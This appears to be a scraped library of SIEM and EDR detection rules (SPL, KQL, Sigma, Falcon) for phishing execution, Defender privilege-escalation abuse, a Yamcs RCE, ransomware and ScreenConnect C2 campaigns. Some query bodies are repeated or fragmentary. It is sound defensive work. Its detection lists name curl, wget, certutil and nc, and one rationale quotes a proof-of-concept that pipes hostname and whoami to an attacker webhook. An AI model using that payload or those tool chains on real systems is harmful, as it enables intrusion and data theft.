``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

| join type=inner src
    [| tstats summariesonly=false earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

[LLM] Nightmare-Eclipse payload 'FunnyApp.exe' execution by name or SHA256 Installation High
Hunts execution of the disguised dropper FunnyApp.exe and its known SHA256 used in the Huntress-observed Nightmare-Eclipse intrusion that pivoted to Defender exploits. Article-specific because it anchors on the exact masquerading filename and hash, not generic suspicious-binary heuristics. Rationale: Anchors on the exact disguised filename (FunnyApp.exe) and the pre-extracted SHA256, both tied to the Huntress-confirmed in-the-wild Nightmare-Eclipse intrusion. Hash match is effectively zero-FP. Cross-checked against: • https://www.huntress.com/blog/nightmare-eclipse-intrusion • https://thehackernews.com/2026/04/three-microsoft-defender-zero-days.html
ATT&CKT1036.005 T1204.002

| project Timestamp, DeviceName, AccountName, FileName, FolderPath, SHA256, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessFolderPath
| order by Timestamp desc
ImProcessCreate

| project TimeGenerated, DvcHostname, ActorUsername, TargetProcessName, TargetProcessCommandLine, SHA256, ParentProcessName
| order by TimeGenerated desc

[LLM] FortiGate VPN / network logon from Nightmare-Eclipse adversary IPs Delivery High
Hunts the initial-access vector of the intrusion: authentication to FortiGate SSL-VPN (or internal hosts) sourced from the campaign's three adversary IPs before pivoting to Defender privilege escalation. Article-specific via the exact IP set tied to compromised FortiGate VPN credentials. Rationale: Uses the three pre-extracted adversary IPs against the FortiGate VPN initial-access TTP reported by Huntress. IP-list match on a remote-access appliance is high-fidelity; Datadog/Sigma left empty as FortiGate VPN telemetry has no standard source/category in those targets here. Cross-checked against: • https://www.huntress.com/blog/nightmare-eclipse-intrusion • https://thehackernews.com/2026/04/three-microsoft-defender-zero-days.html

[LLM] UnDefend: tampering with Windows Defender 'Signature Updates' registry keys Actions on Objectives Medium
Hunts the UnDefend technique that silently freezes Defender's signature update pipeline without health alerts, by detecting non-Defender processes writing under the Windows Defender\Signature Updates registry path. Distinct from generic AV-disable rules — it targets the update-channel keys UnDefend specifically poisons. Rationale: Targets the precise registry surface (Windows Defender\Signature Updates) that the article's UnDefend tool abuses to freeze the definition pipeline, with Defender's own update processes excluded to isolate adversary writes. Falcon left empty — FDR ASEP telemetry doesn't reliably ship non-autostart registry value sets. Cross-checked against: • https://socradar.io/blog/bluehammer-redsun-undefend-windows-defender-0days/ • https://www.helpnetsecurity.com/2026/04/17/microsoft-defender-zero-days-exploited/
ATT&CKT1562.001 T1112

DeviceRegistryEvents

| where RegistryKey has @"\Windows Defender\Signature Updates"
| where ActionType in ("RegistryValueSet","RegistryKeyCreated")
| where InitiatingProcessFileName !in~ ("MsMpEng.exe","MpCmdRun.exe","MpSigStub.exe","TiWorker.exe","MoUsoCoreWorker.exe","svchost.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, RegistryKey, RegistryValueName, RegistryValueData, ActionType
| order by Timestamp desc
ImRegistryEvent
| where TimeGenerated > ago(30d)
| where RegistryKey has @"\Windows Defender\Signature Updates"
| where ActingProcessName !has_any ("MsMpEng.exe","MpCmdRun.exe","MpSigStub.exe","TiWorker.exe","svchost.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, RegistryKey, RegistryValue, RegistryValueData
| order by TimeGenerated desc

[LLM] Nightmare-Eclipse C2 to staybud.dpdns.org / adversary IPs Command & Control High
Hunts command-and-control beaconing from compromised endpoints to the campaign's dynamic-DNS C2 domain staybud.dpdns.org and the three adversary IPs observed in the intrusion. High-fidelity because dpdns.org is free dynamic DNS rarely seen in enterprises and the FQDN plus IPs are campaign-specific. Rationale: Uses the pre-extracted C2 FQDN (staybud.dpdns.org) and three adversary IPs. dpdns.org dynamic-DNS plus exact-IP match is near zero-FP enterprise-wide; covers both DNS and connection telemetry. [LLM] Defender engine (MsMpEng.exe/MpCmdRun.exe) spawning anomalous SYSTEM child — BlueHammer/RedSun privesc Exploitation High
Hunts the privilege-escalation outcome of BlueHammer (CVE-2026-33825 TOCTOU oplock) and RedSun (cloud-rollback abuse), where the Defender service running as SYSTEM is coerced into executing an attacker-controlled binary. MsMpEng.exe effectively never spawns children, so any non-Mp* child from it is a strong exploitation signal. Rationale: Built on the corroborated mechanics: BlueHammer's TOCTOU/oplock and RedSun's rollback coerce the SYSTEM-level Defender engine into running attacker code. MsMpEng.exe spawning any non-Mp* child is exceptionally rare, making this a high-fidelity privesc detection rather than a generic LOLBin query. Cross-checked against: • https://www.picussecurity.com/resource/blog/bluehammer-redsun-windows-defender-cve-2026-33825-zero-day-vulnerability-explained • https://nvd.nist.gov/vuln/detail/CVE-2026-33825 • https://socradar.io/blog/bluehammer-redsun-undefend-windows-defender-0days/
ATT&CKT1068 T1211
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName in~ ("MsMpEng.exe","MpCmdRun.exe")
| where FileName !in~ ("MpSigStub.exe","MpCmdRun.exe","conhost.exe","MsMpEng.exe","MpCopyAccelerator.exe")
| where InitiatingProcessFileName =~ "MsMpEng.exe" or FolderPath has_any (@"\Users\", @"\Temp\", @"\ProgramData\", @"\Downloads\", @"\AppData\", @"\Public\")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, FileName, FolderPath, ProcessCommandLine, ProcessIntegrityLevel, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ParentProcessName has_any ("MsMpEng.exe","MpCmdRun.exe")
| where not (TargetProcessName has_any ("MpSigStub.exe","MpCmdRun.exe","conhost.exe","MsMpEng.exe","MpCopyAccelerator.exe"))
| where ParentProcessName has "MsMpEng.exe" or TargetProcessName has_any (@"\Users\", @"\Temp\", @"\ProgramData\", @"\AppData\", @"\Public\")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, TargetProcessName, TargetProcessCommandLine, TargetProcessIntegrityLevel, SHA256
| order by TimeGenerated desc
title: Windows Defender Engine Spawning Anomalous Child (BlueHammer/RedSun Privesc)
id: a4c7e9d2-5b81-4f63-9e0a-2c6d3f1b8e75
description: Detects MsMpEng.exe or MpCmdRun.exe spawning a non-Defender child process, indicative of BlueHammer (CVE-2026-33825) TOCTOU or RedSun rollback abuse executing code as SYSTEM.
references:
  - https://www.picussecurity.com/resource/blog/bluehammer-redsun-windows-defender-cve-2026-33825-zero-day-vulnerability-explained
  - https://nvd.nist.gov/vuln/detail/CVE-2026-33825
author: SOC Detection Engineering
date: 2026/05/27
tags:
  - attack.t1068
  - attack.t1211
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith:
      - '\MsMpEng.exe'
      - '\MpCmdRun.exe'
  filter_legit:
    Image|endswith:
      - '\MpSigStub.exe'
      - '\MpCmdRun.exe'
      - '\conhost.exe'
      - '\MpCopyAccelerator.exe'
  condition: selection and not filter_legit
level: high
source:windows.sysmon @EventID:1 @ParentImage:(*\MsMpEng.exe OR *\msmpeng.exe OR *\MpCmdRun.exe OR *\mpcmdrun.exe) -@Image:(*\MpSigStub.exe OR *\mpsigstub.exe OR *\MpCmdRun.exe OR *\mpcmdrun.exe OR *\conhost.exe OR *\MpCopyAccelerator.exe)
#event_simpleName=ProcessRollup2 ParentBaseFileName=/(MsMpEng|MpCmdRun)\.exe$/i
| NOT (ImageFileName=/(MpSigStub|MpCmdRun|conhost|MsMpEng|MpCopyAccelerator)\.exe$/i)
| groupBy([aid, ComputerName, ParentBaseFileName, ImageFileName, CommandLine, IntegrityLevel], function=count())

Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=t count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.parent_process_name="MsMpEng.exe" OR Processes.parent_process_name="MpCmdRun.exe") AND NOT Processes.process_name IN ("MpSigStub.exe","MpCmdRun.exe","conhost.exe","MsMpEng.exe") by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process Processes.process_integrity_level | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.parent_process_name="MsMpEng.exe" OR Processes.parent_process_name="MpCmdRun.exe") AND NOT Processes.process_name IN ("MpSigStub.exe","MpCmdRun.exe","conhost.exe","MsMpEng.exe") by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process Processes.process_integrity_level | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats summariesonly=false earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats summariesonly=false count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats summariesonly=false earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd

Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200

| order by TimeGenerated desc

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("a2b6c7a9c4490df70de3cdbfa5fc801a3e1cf6a872749259487e354de2876b7c") or SHA1 in~ ("a2b6c7a9c4490df70de3cdbfa5fc801a3e1cf6a872749259487e354de2876b7c") or MD5 in~ ("a2b6c7a9c4490df70de3cdbfa5fc801a3e1cf6a872749259487e354de2876b7c")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("a2b6c7a9c4490df70de3cdbfa5fc801a3e1cf6a872749259487e354de2876b7c") or SHA1 in~ ("a2b6c7a9c4490df70de3cdbfa5fc801a3e1cf6a872749259487e354de2876b7c") or MD5 in~ ("a2b6c7a9c4490df70de3cdbfa5fc801a3e1cf6a872749259487e354de2876b7c")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["a2b6c7a9c4490df70de3cdbfa5fc801a3e1cf6a872749259487e354de2876b7c"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Hunts the Yamcs Java mission-control process (java/yamcsd) spawning a Unix shell or command interpreter (bash/sh/curl/wget/python/nc) as a child. The Janino SimpleCompiler RCE compiles attacker-supplied algorithm text containing java.lang.Runtime.getRuntime().exec(), so a JVM-parent → shell-child tree on a Yamcs host is the core post-exploitation signal that the injected algorithm executed. Rationale: Anchored on the article's PoC payload `java.lang.Runtime.getRuntime().exec(new String[]{"bash","-c","curl ..."})` — the deterministic post-exploitation artefact is a Yamcs JVM (java/yamcsd) parent forking a shell/network tool, which a mission-control JVM almost never does legitimately. Cross-checked against GHSA-524g-x36v-9wm6 and CIRCL Vulnerability-Lookup. Cross-checked against: • https://github.com/advisories/GHSA-524g-x36v-9wm6 • https://vulnerability.circl.lu/vuln/ghsa-524g-x36v-9wm6 • https://github.com/yamcs/yamcs

[LLM] Yamcs MDB algorithm override PATCH with Java Runtime payload Delivery Medium
Hunts authenticated HTTP PATCH requests to the Yamcs Mission Database algorithm override endpoint (/api/mdb/<instance>/<processor>/algorithms/...), the exact exploitation vector for CVE-2026-44632. High-fidelity when the request body / URL contains java.lang.Runtime or Runtime.getRuntime, indicating an injected OS-command payload rather than a benign algorithm edit. Rationale: Uses the exact endpoint shape from the PoC curl — `PATCH /api/mdb/<instance>/<processor>/algorithms/...` with `action:SET` and a `text` field embedding `java.lang.Runtime.getRuntime().exec()`. URL+method alone is a benign admin action so this is hunting-tier; the body/Message match on Runtime.getRuntime is what elevates fidelity where the WAF logs request bodies. Defender has no inbound web-server table for the Yamcs JVM, so defender_kql is intentionally empty. Cross-checked against: • https://github.com/advisories/GHSA-524g-x36v-9wm6 • https://docs.yamcs.org/yamcs-server-manual/mdb/algorithm-definitions/
ATT&CKT1190 T1059
Data sourcesWeb.Web
CommonSecurityLog

| where RequestMethod =~ "PATCH"
| where RequestURL has "/api/mdb/" and RequestURL has "/algorithms/"
| where (Message has_any ("java.lang.Runtime","Runtime.getRuntime",".exec(") or DeviceCustomString1 has_any ("java.lang.Runtime","Runtime.getRuntime"))
   or RequestURL has "/algorithms/"
| project TimeGenerated, SourceIP, SourceUserName, DestinationIP, DestinationPort, RequestMethod, RequestURL, RequestClientApplication, Message
| order by TimeGenerated desc

[LLM] Outbound recon callback from Yamcs host (curl/shell child of JVM to public IP) Command & Control High
Hunts external network connections initiated by a shell or download tool (curl/wget/bash/python/nc) whose parent is the Yamcs JVM. CVE-2026-44632's PoC payload exfiltrates host recon via `curl https://<webhook>/$(hostname)_$(whoami)`, so a java-parented curl reaching a public IP confirms successful RCE and data egress. Rationale: Targets the PoC's egress shape — a curl/shell child of the Yamcs JVM beaconing host recon (`$(hostname)_$(whoami)`) to an attacker webhook over a public IP. Distinct network pivot from UC1's process tree. Sentinel ASIM ImNetworkSession carries no initiating-parent-process lineage so sentinel_kql is left empty; SPL Network_Traffic lacks parent lineage and is therefore a coarser app-based approximation — the Defender/Falcon EDR queries are the authoritative form. Cross-checked against: • https://github.com/advisories/GHSA-524g-x36v-9wm6 • https://vulnerability.circl.lu/vuln/ghsa-524g-x36v-9wm6

Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Unauthorized ScreenConnect client beaconing to directdownload.icu:8041 / 193.42.11.108 · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Remote service execution — PsExec / SMB lateral movement · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft)
[LLM] ZIP delivery from gleeze.com look-alike utility download sites (SEO/AI poisoning) Delivery High
Hunts browser-initiated ZIP downloads whose origin URL is a subdomain of the campaign's Dynu-hosted gleeze.com infrastructure (e.g. direct-download.gleeze.com/crystaldiskinfo). This is the initial-access foothold for the cryptojacking chain that impersonates CrystalDiskInfo, HWMonitor, FurMark, DDU, K-Lite and PDFgear. Rationale: Anchors on the article's named distribution infra (gleeze.com subdomains, directdownload.icu) corroborated by an ANY.RUN run of direct-download.gleeze.com/crystaldiskinfo and gbhackers/The Register reporting; 150+ subdomains all funnel the same ZIP, so the parent domain is a stable pivot. Cross-checked against: • https://gbhackers.com/seo-poisoning-attack/ • https://any.run/report/6468f63767212e0c1e4fe5d0eaa9137c4547ff173dc55b2d7fb1b2e445802d45/48172448-8ac9-4c17-8fef-bbf0c9a3d1e3 • https://www.theregister.com/2026/04/10/cpuid_site_hijacked/

[LLM] DLL side-loading of autorun.dll by spoofed hardware-utility executables Installation High
Detects the legitimate (but trojanized-bundle) utility binaries — CrystalDiskInfo, HWMonitor, FurMark, DDU, PDFgear, K-Lite — loading a malicious autorun.dll from a user-writable folder via DLL search-order side-loading. Nine distinct autorun.dll variants were observed across the campaign; the module name + non-system host pairing is the high-fidelity signal. Rationale: Uses the exact malicious module name (autorun.dll) plus the article's enumerated host utilities; the image-load relationship from a user-writable path distinguishes side-loading from normal program startup. Datadog/Falcon use the autorun.dll file-write as a proxy since their FDR/Sysmon image-load fields aren't in scope here. Sentinel left blank: no standard Sentinel table carries Sysmon EID 7 image-load metadata in this tenant. Cross-checked against: • https://gbhackers.com/seo-poisoning-attack/ • https://cyberpress.org/seo-attack-deploys-rmm/

[LLM] msiexec silently installing masqueraded vcredist_x64.dll (ScreenConnect packaged installer) Installation High
Detects autorun.dll's second stage: msiexec.exe silently installing a DLL named vcredist_x64.dll that poses as the Visual C++ Redistributable but is actually a packaged ScreenConnect (ConnectWise Control) installer. The DLL-as-MSI-payload plus silent flags is the article-specific behaviour. Rationale: Anchors on the verbatim payload name vcredist_x64.dll passed to msiexec — a DLL is never a normal MSI target, making this near-zero-FP. Corroborated by gbhackers ('Microsoft Binary to Install RMM Tool') and cyberpress describing msiexec/MSI abuse to deploy the RMM. Cross-checked against: • https://gbhackers.com/seo-poisoning-attack/ • https://cyberpress.org/seo-attack-deploys-rmm/

[LLM] Unauthorized ScreenConnect client beaconing to directdownload.icu:8041 / 193.42.11.108 Command & Control High
Detects the abused ScreenConnect.ClientService.exe launched with the attacker's relay parameters (h=directdownload.icu, p=8041, session GUID b31c5795-9b66-4d20-ac8d-aad60d05852a, c=Crystaldeskinfo) or beaconing to C2 IP 193.42.11.108. This establishes the persistent remote access that could pivot to data theft or ransomware. Rationale: Uses the verbatim ScreenConnect service-invocation string from the article (relay host directdownload.icu, port 8041, exact session GUID, Crystaldeskinfo custom property) — these are unique to the attacker tenant, so any match is a confirmed compromise; the C2 IP 193.42.11.108 provides a network corroborator. Cross-checked against: • https://www.scworld.com/brief/malware-crafted-through-connectwise-screenconnect-exploitation • https://gbhackers.com/seo-poisoning-attack/

[LLM] SimpleRunPE / RuntimeHost.exe dropped to hidden D3F4E2A1 install folder Installation High
